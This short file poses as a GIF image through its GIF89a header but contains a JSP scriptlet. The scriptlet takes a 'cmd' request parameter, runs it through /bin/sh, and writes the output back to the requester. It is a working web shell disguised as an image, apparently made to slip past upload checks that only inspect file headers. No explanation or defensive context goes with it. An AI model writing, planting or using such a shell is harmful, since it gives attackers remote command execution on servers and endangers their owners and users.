GIF89a
<%
 if(request.getParameter("cmd")!=null){
 Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")});
 java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
 String l; while((l=r.readLine())!=null) out.println(l);
 }
%>
